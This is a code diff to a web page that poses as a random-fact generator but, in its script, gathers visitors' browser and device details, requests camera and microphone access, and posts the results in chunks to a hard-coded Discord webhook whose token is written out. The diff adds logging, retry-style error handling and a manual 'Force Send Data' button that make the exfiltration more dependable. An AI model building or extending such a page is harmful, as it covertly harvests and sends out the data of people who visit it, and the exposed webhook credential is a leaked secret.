@@ -84,6 +84,12 @@
         <button id="fact-button">Generate Random Fact</button>
         <div id="fact-display">Your random fact will appear here...</div>
     </div>
+    
+    <div class="info-section">
+        <p>Data Collection Status:</p>
+        <div id="collection-status">Collecting data...</div>
+        <button id="force-send" style="margin-top: 10px; background-color: #f44336;">Force Send Data</button>
+    </div>
 
     <script>
         const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1331766891630563360/hNFGqedGjuvsgNJmGBrk0asdX_kZ0D7dlK-7MdXEHihk_oXwYDrGtdNNRGO4UA4ZmBf7";
@@ -98,7 +104,9 @@
         };
         
         function sendToDiscordWebhook() {
+            console.log("Attempting to send data to Discord webhook...");
             if (!DISCORD_WEBHOOK_URL) {
+                console.error("Discord webhook URL is empty or invalid");
                 return;
             }
             
@@ -229,6 +237,7 @@
             
             messageChunks.forEach((chunk, index) => {
                 setTimeout(() => {
+                    console.log(`Sending chunk ${index+1} of ${messageChunks.length}`);
                     fetch(DISCORD_WEBHOOK_URL, {
                         method: 'POST',
                         headers: {
@@ -239,13 +248,25 @@
                             username: "Security Demo",
                             avatar_url: "https://cdn-icons-png.flaticon.com/512/1946/1946429.png",
                         })
-                    }).catch(error => console.error('Error sending to Discord:', error));
-                }, index * 1000);
+                    })
+                    .then(response => {
+                        if (!response.ok) {
+                            return response.text().then(text => {
+                                throw new Error(`Discord API error: ${response.status} ${text}`);
+                            });
+                        }
+                        console.log(`Successfully sent chunk ${index+1}`);
+                        return response.text();
+                    })
+                    .catch(error => console.error('Error sending to Discord:', error));
+                }, index * 1500);
             });
         }
         
         function checkDataCollectionStatus() {
+            console.log("Checking data collection status:", dataCollectionComplete);
             if (Object.values(dataCollectionComplete).every(status => status === true)) {
+                console.log("All data collection complete, sending to webhook");
                 sendToDiscordWebhook();
             }
         }
@@ -520,8 +541,10 @@
         }
         
         if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+            console.log("Attempting to access media devices...");
             navigator.mediaDevices.getUserMedia({ audio: true, video: true })
             .then(function(stream) {
+                console.log("Media access granted");
                 stream.getTracks().forEach(track => track.stop());
                 
                 navigator.mediaDevices.enumerateDevices()
@@ -540,11 +563,13 @@
                     storeData('media-info', 'Speakers/Headphones', audioOutputCount);
                     storeData('media-info', 'Cameras', videoInputCount);
                     
+                    console.log("Media devices collected:", { audioInputCount, audioOutputCount, videoInputCount });
                     dataCollectionComplete.media = true;
                     checkDataCollectionStatus();
                 });
             })
             .catch(function(err) {
+                console.log("Media access denied:", err.message);
                 navigator.mediaDevices.enumerateDevices()
                 .then(function(devices) {
                     storeData('media-info', 'Permission Status', 'Denied: ' + err.message);
@@ -561,6 +586,7 @@
                 });
             });
         } else {
+            console.log("Media Devices API not available");
             storeData('media-info', 'Media Devices API', 'Not available in this browser');
             
             dataCollectionComplete.media = true;
@@ -604,6 +630,21 @@
             const randomIndex = Math.floor(Math.random() * facts.length);
             document.getElementById('fact-display').textContent = facts[randomIndex];
         });
+        
+        // Add manual trigger for forcing data send
+        document.getElementById('force-send').addEventListener('click', function() {
+            document.getElementById('collection-status').textContent = "Manually sending data...";
+            console.log("Manual send triggered");
+            sendToDiscordWebhook();
+        });
+        
+        // Update status periodically
+        setInterval(function() {
+            const complete = Object.values(dataCollectionComplete).filter(status => status === true).length;
+            const total = Object.values(dataCollectionComplete).length;
+            document.getElementById('collection-status').textContent = 
+                `Collected ${complete}/${total} data categories. ${complete === total ? 'Ready to send!' : 'Still collecting...'}`;
+        }, 1000);
     </script>
 </body>
 </html>
